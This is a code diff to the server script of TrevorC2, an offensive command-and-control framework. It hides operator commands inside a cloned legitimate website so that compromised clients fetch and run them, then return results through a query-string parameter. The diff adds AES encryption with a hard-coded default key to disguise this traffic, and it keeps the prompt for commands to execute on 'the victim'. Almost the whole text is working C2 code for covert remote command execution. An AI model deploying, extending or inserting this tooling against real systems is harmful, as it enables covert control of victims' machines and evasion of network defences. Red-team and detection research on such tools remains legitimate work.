@@ -11,6 +11,32 @@ the site is cloned, it'll place information inside the source of the html
 to be decoded by the client and executed and then passed back to the server
 via a query string parameter.
 """
+
+# CONFIG CONSTANTS:
+URL = ("https://www.google.com/")  # URL to clone to house a legitimate website
+USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
+
+# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
+ROOT_PATH_QUERY = ("/")
+
+# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
+SITE_PATH_QUERY = ("/images")
+
+# THIS IS THE QUERY STRING PARAMETER USED
+QUERY_STRING = ("guid=")
+
+# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
+STUB = ("oldcss=")
+
+# Turn to True for SSL support
+SSL = False
+CERT_FILE = ""  # Your Certificate for SSL
+
+# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
+CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+
+# DO NOT CHANGE BELOW THIS LINE
+
 import os
 import re
 import ssl
@@ -27,6 +53,9 @@ import threading
 import tornado.web
 import tornado.ioloop
 import tornado.httpserver
+import hashlib
+from Crypto import Random
+from Crypto.Cipher import AES
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
@@ -35,30 +64,46 @@ logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', 
 log = logging.getLogger(__name__)
 
 __author__ = 'Dave Kennedy (@HackingDave)'
-__version__ = 0.2
+__version__ = 0.3
 
-# CONFIG CONSTANTS:
-URL = ("https://www.google.com/")  # URL to clone to house a legitimate website
-USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
+# AESCipher Library Python2/3 support
+class AESCipher(object):
+    """
+    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
+    Also ensure the coherence and the type of the data with a unicode to byte converter.
+    """
+    def __init__(self, key):
+        self.bs = 32
+        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
 
-# THIS IS WHAT PATH WE WANT TO HIT FOR CODE
-ROOT_PATH_QUERY = ("/")
+    @staticmethod
+    def str_to_bytes(data):
+        u_type = type(b''.decode('utf8'))
+        if isinstance(data, u_type):
+            return data.encode('utf8')
+        return data
 
-# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
-SITE_PATH_QUERY = ("/images")
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))
 
-# THIS IS THE QUERY STRING PARAMETER USED
-QUERY_STRING = ("guid=")
+    @staticmethod
+    def _unpad(s):
+        return s[:-ord(s[len(s)-1:])]
 
-# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
-STUB = ("oldcss=")
+    def encrypt(self, raw):
+        raw = self._pad(AESCipher.str_to_bytes(raw))
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')
 
-SSL = False
-CERT_FILE = ""  # Your Certificate for SSL
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
 
-
-# DO NOT CHANGE BELOW THIS LINE
-
+# add cipher key here
+cipher = AESCipher(key=CIPHER)
 
 def htc(m):
     """Decode URL for Postbacks."""
@@ -148,14 +193,15 @@ class SPQ(tornado.web.RequestHandler):
                 query = args[param][0]
         if not query:
             return
-        query_output = base64.b64decode(query).decode()  # print our decoded command
+
+        query_output = base64.b64decode(query)
+        query_output = cipher.decrypt(query_output)
         with open("clone_site/received.txt", "w") as fh:
             fh.write('=-=-=-=-=-=-=-=-=-=-=\n(CLIENT: {})\n{}'.format(remote_ip, str(query_output)))
 
         with open("clone_site/instructions.txt", "w") as fh:
-            no_instructions = base64.b64encode("nothing".encode())
+            no_instructions = cipher.encrypt("nothing".encode())
             fh.write(no_instructions.decode())
-
 
 def main_c2():
     """Start C2 Server."""
@@ -230,7 +276,7 @@ if __name__ == "__main__":
 
     # here we say no instructions to the client
     with open("clone_site/instructions.txt", "w") as fh:
-        no_instructions = base64.b64encode("nothing".encode())
+        no_instructions = cipher.encrypt("nothing".encode())
         fh.write(no_instructions.decode())
 
     print("[*] Next, enter the command you want the victim to execute.")
@@ -243,7 +289,7 @@ if __name__ == "__main__":
                 task = input("Enter the command to execute on the victim: ")
             else:
                 sys.exit("Not sure I support this version of Python.")
-            task_out = base64.b64encode(task.encode())  # Encode to bytes (python3 support)
+            task_out = cipher.encrypt(task.encode())
             with open("clone_site/instructions.txt", "w") as fh:
                 fh.write(task_out.decode())
             print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
@@ -258,9 +304,8 @@ if __name__ == "__main__":
                     break
                 time.sleep(.3)
 
-        # cleanup when using keyboardinterrupt
+    # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
-        if os.path.isdir("clone_site/"):
-            shutil.rmtree("clone_site/")
+        if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
         print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
-        sys.exit()
+        os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
